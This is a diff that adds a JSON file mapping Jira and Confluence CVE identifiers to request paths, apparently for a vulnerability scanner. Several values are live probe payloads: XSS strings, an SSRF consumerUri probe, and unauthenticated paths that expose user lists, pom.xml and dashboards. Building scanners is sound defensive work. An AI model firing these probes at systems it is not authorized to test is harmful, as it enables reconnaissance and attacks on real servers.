@@ -1,0 +1,13 @@
+{
+    "CVE-2017-9506": "/plugins/servlet/oauth/users/icon-uri?consumerUri=http://bing.com",
+    "CVE-2018-5230": "/pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E.vm",
+    "CVE-2018-20824": "/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)",
+    "CVE-2019-3396": "/rest/tinymce/1/macro/preview",
+    "CVE-2019-3402": "/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search",
+    "CVE-2019-3403": "/rest/api/2/user/picker?query=<user_name_here>",
+    "CVE-2019-8442": "/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml",
+    "CVE-2019-8449": "/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true",
+    "CVE-2020-14178": "/browse.<project_key>",
+    "jira-unauth-popular-filters": "/secure/ManageFilters.jspa?filterView=popular",
+    "jira-unauthenticated-dashboards": "/rest/api/2/dashboard?maxResults=100"
+}
